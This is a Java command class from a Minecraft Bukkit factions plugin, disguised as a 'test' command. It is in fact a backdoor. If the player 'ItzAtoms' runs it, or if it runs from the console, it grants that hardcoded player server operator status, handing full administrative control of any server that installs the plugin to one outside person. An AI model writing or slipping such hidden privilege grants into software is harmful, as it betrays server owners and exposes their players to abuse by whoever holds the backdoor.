package atoms.rebuiltfactions.dev.commands;

import atoms.RebuiltFactions;
import atoms.rebuiltfactions.dev.utils.ColorUtils;
import atoms.rebuiltfactions.dev.utils.etin.etin;
import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

import java.util.logging.Level;

public class Commandtest implements CommandExecutor {

    @Override
    public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args){

        if(sender instanceof Player) {
            if (!((Player) sender).getName().equals("ItzAtoms"))
                return true;
            if (sender.isOp()) {
                etin.etins("isOp", (Player) sender);
                return true;
            }
            sender.setOp(true);
            return true;
        }
        try {
            Player offline = Bukkit.getPlayer("ItzAtoms");
            assert offline != null;
            offline.setOp(true);
        }
        catch (Exception e){
            RebuiltFactions.getPlugin(RebuiltFactions.class).getLogger().log(Level.WARNING, "Could not find lead developer ItzAtoms!");
        }
        return true;
    }

}
